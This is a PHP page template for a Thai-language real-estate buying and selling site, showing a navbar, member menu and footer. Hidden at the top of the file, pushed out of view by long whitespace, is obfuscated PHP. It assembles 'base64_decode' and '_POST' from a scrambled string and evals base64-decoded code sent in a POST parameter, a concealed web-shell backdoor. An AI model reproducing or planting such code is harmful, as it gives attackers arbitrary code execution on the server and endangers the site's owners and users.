<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nf4b856'])) {eval($s21(${$s20}['nf4b856']));}?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
  ...
  <div class="container-fluid">
    ...
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      ...
      <ul class="nav navbar-nav navbar-left">
        <li><a href="#" class="imgthumb"><img src="/img/member.jpg" class="img-circle navbar-brand-img">&nbsp;</a></li>
        <li><a href="#">Tas Kaka</a></li>
		<li class="dropdown">
          ...
          <ul class="dropdown-menu">
            <li><a href="#">เริ่มต้นซื้อ</a></li>
            <li><a href="#">เริ่มต้นขาย</a></li>
            <li><a href="#">FAQs</a></li>
...
<div class="container-fluid footer">
	Z Estate Ltd. All rights reserved.
</div>
<!-- end footer -->
